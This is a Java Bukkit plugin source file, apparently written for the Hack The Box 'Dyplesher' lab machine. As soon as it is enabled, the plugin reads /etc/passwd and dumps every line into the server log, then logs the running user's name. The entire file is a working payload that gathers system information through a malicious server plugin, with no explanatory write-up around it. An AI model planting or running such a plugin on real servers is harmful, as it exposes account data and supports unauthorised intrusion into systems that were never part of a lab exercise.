package htb.dyplesher.cfx;

import org.bukkit.plugin.java.JavaPlugin;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;

public class fusion extends JavaPlugin {
    @Override
    public void onEnable() {
        getLogger().info("onEnable is called!");

//Reading /etc/password
        try {
            String currentLine;
            BufferedReader reader = new BufferedReader(new FileReader("/etc/passwd"));
            while ((currentLine = reader.readLine()) != null) {
                getLogger().info(currentLine);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
//Fetching Username
        getLogger().info(System.getProperty("user.name"));
    }

    @Override
    public void onDisable() {
        getLogger().info("onDisable is called!");
    }
}
